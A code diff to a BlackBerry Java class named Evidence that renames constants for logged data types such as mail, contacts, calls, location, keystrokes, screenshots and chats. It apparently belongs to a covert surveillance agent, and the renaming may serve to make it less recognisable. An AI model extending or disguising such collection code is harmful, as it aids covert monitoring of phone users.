@@ -62,16 +62,16 @@ import blackberry.utils.WChar;
  * The Class Evidence (formerly known as Log.)
  */
 public final class Evidence {
-    private static final int EVIDENCE_VERSION_01 = 2008121901;
+    private static final int E_VERSION_01 = 2008121901;
     /*
      * Tipi di log (quelli SOLO per mobile DEVONO partire da 0xAA00
      */
 
-    public static final int EVIDENCE_MAGIC_CALLTYPE = 0x0026;
+    public static final int E_MAGIC_CALLTYPE = 0x0026;
 
-    public static int EVIDENCE_DELIMITER = 0xABADC0DE;
+    public static int E_DELIMITER = 0xABADC0DE;
 
-    public static final int[] TYPE_EVIDENCE = new int[] {
+    public static final int[] TYPE_E = new int[] {
             EvidenceType.INFO,
             EvidenceType.MAIL_RAW,
             EvidenceType.ADDRESSBOOK,
@@ -89,7 +89,7 @@ public final class Evidence {
             EvidenceType.NONE // 12
     };
 
-    public static final String[] MEMO_TYPE_EVIDENCE = new String[] { "INF",
+    public static final String[] MEMO_TYPE_E = new String[] { "INF",
             "MAR", "ADD", "CLL", // 0..3
             "DEV", "LOC", "CAL", "CLM", // 4..7
             "KEY", "SNP", "URL", "CHA", // 8..b
@@ -120,10 +120,10 @@ public final class Evidence {
     public static int convertTypeEvidence(final int agentId) {
         final int agentPos = agentId - Agent.AGENT;
         //#ifdef DBC
-        Check.requires(TYPE_EVIDENCE != null, "Null TypeEvidence");
+        Check.requires(TYPE_E != null, "Null TypeEvidence");
         //#endif
-        if (agentPos >= 0 && agentPos < TYPE_EVIDENCE.length) {
-            final int typeLog = TYPE_EVIDENCE[agentPos];
+        if (agentPos >= 0 && agentPos < TYPE_E.length) {
+            final int typeLog = TYPE_E[agentPos];
             return typeLog;
         }
 
@@ -516,7 +516,7 @@ public final class Evidence {
         final DateTime datetime = new DateTime(timestamp);
 
         evidenceDescription = new EvidenceDescription();
-        evidenceDescription.version = EVIDENCE_VERSION_01;
+        evidenceDescription.version = E_VERSION_01;
         evidenceDescription.logType = logType;
         evidenceDescription.hTimeStamp = datetime.hiDateTime();
         evidenceDescription.lTimeStamp = datetime.lowDateTime();
